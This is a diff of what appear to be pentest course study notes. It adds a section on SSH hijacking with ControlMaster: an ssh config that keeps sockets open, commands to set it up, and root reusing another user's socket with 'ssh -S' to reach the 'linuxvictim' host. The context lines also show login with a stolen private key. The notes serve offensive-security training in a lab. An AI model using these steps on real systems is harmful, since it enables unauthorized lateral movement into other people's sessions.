@@ -55,4 +55,31 @@ the linuxvictim user without a password
 kali@kali:~$ ssh -i /id_rsa linuxvictim@linuxvictim
 ```
 
-page 533
+#### ssh hijacking with controlmaster
+The term SSH hijacking refers to the use of an existing SSH connection to gain access to another machine. ControlMaster is a feature that enables sharing of multiple SSH sessions over a single network connection.
+
+1.We’ll start by logging in to our Linux controller machine as the offsec user, and create the
+**~/.ssh/config** file, with the following content:
+ 
+```
+Host *
+      ControlPath ~/.ssh/controlmaster/%r@%h:%p
+      ControlMaster auto
+      ControlPersist 10m
+```
+
+- ->~/.ssh/controlmaster/ with the name <remoteusername@<targethost>:<port>.
+- ControlMaster line identifies that any new connections will attempt to use existing ControlMaster sockets when possible.
+- ControlPersist can either be set to “yes” or to a specified time. If it is set to “yes”, the socket stays open indefinitely.
+ 
+ 2. We will create the ~/.ssh/controlmaster/ directory and  set the correct permission on the ssh configuration file
+ ```
+ offsec@controller:~$ chmod 644 ~/.ssh/config
+ offsec@controller:~$ mkdir ~/.ssh/controlmaster
+ ```
+ 3.Now the users on controller ssh into another remote host, we can piggyback the connection with the controlmaster.
+ ```
+ offsec@controller:~$ ssh offsec@linuxvictim
+ 
+ root@controller:~# ssh -S /home/offsec/.ssh/controlmaster/offsec\@linuxvictim\:22 offsec@linuxvictim
+ ```
